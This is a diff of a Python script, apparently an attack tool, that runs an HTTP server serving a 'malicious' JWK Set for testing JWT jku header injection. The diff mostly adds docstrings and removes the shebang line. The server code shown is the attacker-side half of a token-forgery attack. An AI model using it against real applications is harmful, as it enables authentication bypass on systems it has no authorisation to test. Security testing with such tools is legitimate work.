@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 """
 Simple HTTP server to serve a malicious JWK Set for jku injection testing.
 Usage: python3 malicious_jwk_server.py [--port PORT]
@@ -24,10 +23,13 @@ JWKS_DATA = {
 }
 
 class JWKHandler(BaseHTTPRequestHandler):
+    """HTTP request handler that serves a malicious JWK Set,
+    generating or updating JWK keys and logging the 'kid'."""
+    
     def log_message(self, format, *args):
         # Optional: suppress default logging or add custom
         print(f"[{self.address_string()}] {format % args}")
-    
+
     def do_GET(self):
         if self.path == '/.well-known/jwks.json':
             self.send_response(200)
@@ -39,7 +41,7 @@ class JWKHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
             print(f"  ✗ 404 Not found: {self.path}")
-    
+
     def do_HEAD(self):
         self.send_response(200)
         self.end_headers()
@@ -51,6 +53,8 @@ def update_jwks(jwk_dict):
     print(f"[*] JWK Set updated with kid: {jwk_dict.get('kid', 'unknown')}")
 
 def run_server(port=9000):
+    """Starts an HTTP server on the specified port using JWKHandler to
+    serve malicious JWK Set requests."""
     server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, JWKHandler)
     print(f"""
